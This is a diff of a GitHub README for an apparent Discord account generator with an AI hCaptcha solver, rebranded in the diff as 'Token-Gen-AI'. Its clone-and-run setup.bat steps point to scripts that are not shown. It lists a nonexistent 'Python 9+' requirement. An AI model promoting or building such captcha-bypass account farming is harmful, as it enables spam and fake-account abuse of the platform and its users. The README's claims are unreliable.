@@ -1,30 +1,39 @@
-# Discord Token Generator with AI Captcha Solver
+# Token-Gen-AI: Advanced Captcha Solving with Artificial Intelligence
 
-Unlock the power of the latest Discord account generator featuring cutting-edge Hcaptcha solving with adaptive AI machine learning algorithms.
+Unlock the potential of cutting-edge AI technology for captcha solving with Token-Gen-AI.
 
-## About
+![AI in Action](gif.gif)
 
-Discover the ultimate solution for creating Discord accounts effortlessly, complete with robust Hcaptcha solving capabilities powered by advanced AI technology.
+## Installation Instructions
 
-## Requirements 
-1. Python 9+
-2. patience
-3. a good wifi/network
-4. A brain
+### Method 1: Streamlined Setup
 
-## Installation
+1. Launch your terminal.
+2. Execute `git clone https://github.com/Ayato0000/token-gen-ai`.
+3. Run `setup.bat` to automate the installation process.
 
-Get started with the Discord Token Generator in no time with these simple steps:
+### Method 2: Manual Configuration
 
-1. **Clone the Repository**:  ```git clone https://github.com/AshtrX/discord-token-gen```
-2. **Easy Setup**: For a hassle-free installation, run the `setup.bat` file. It's recommended and simplifies the process significantly. Alternatively, you can manually install the required dependencies by executing:
-```pip install -r requirements.txt```
-3. Then, launch the application with:
-```python main.py```
+1. Open your terminal.
+2. Clone the repository with `git clone https://github.com/Ayato0000/token-gen-ai`.
+3. Navigate to the `token-gen-ai` directory.
+4. Install required dependencies using `pip install -r requirements.txt`.
+5. Initiate the program with `python main.py`.
 
-> NOTE
- i made this tool/project to help developers get into machine learning and ai development through something fun, i intend no harm or whatsoever to anyones system. This is just a fun powerful project which people can modify and test out new things with it or use it for their own personal benefits. If you decide to skid please give me credits because it almost took me 3 weeks to complete this project due to college and lack of time plus it was lowkey hard to figure out the algorithms to autotrain the models continously.
+## System Requirements
+
+Ensure your system meets these prerequisites:
+
+1. Python 9+ (the latest version is recommended for optimal performance).
+2. Windows 10 or 11.
+3. A curious mind.
+
+> Note: As of October 8, 2023, Token-Gen-AI is fully operational. We will promptly update if any patches become necessary. Remember, sharing knowledge benefits everyone; please provide credit if you find our work valuable.
+
+> To aspiring developers: This source code is generously shared to facilitate understanding of machine learning in captcha-solving—an outcome of our dedication and hard work.
 
 
-Thank for using my project.
+
+
+Your support fuels our dedication to furthering the boundaries of AI and cryptography.
 
